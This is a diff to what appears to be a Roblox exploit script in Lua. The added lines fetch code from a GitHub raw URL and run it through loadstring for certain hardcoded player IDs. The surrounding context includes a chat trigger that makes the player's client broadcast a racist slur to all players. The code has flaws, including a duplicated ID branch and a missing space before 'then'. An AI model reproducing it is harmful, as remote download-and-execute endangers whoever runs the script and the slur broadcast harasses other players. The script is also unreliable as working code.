@@ -1,3 +1,16 @@
+local playerId = game.Players.LocalPlayer.UserId
+
+if playerId == 7801483850 then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Zelerator/UniService/refs/heads/main/Custom%20Key'))()
+elseif playerId == 997344088 then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Zelerator/UniService/refs/heads/main/Custom%20Key'))()
+elseif playerId == 2647296618 then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Zelerator/UniService/refs/heads/main/Custom%20Key'))()
+elseif playerId == 2647296618 then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Zelerator/UniService/refs/heads/main/Custom%20Key'))()
+elseif playerId == 2976399796then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Zelerator/UniService/refs/heads/main/Custom%20Key'))()
+else
 local function onChatMessage(message, speaker)
     if message == "Ax1" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Hate Niggers So Fucking Much", "All")
@@ -2758,4 +2771,4 @@ KeyInput.FocusLost:Connect(function(enterPressed)
         end
     end
 end)
-
+end
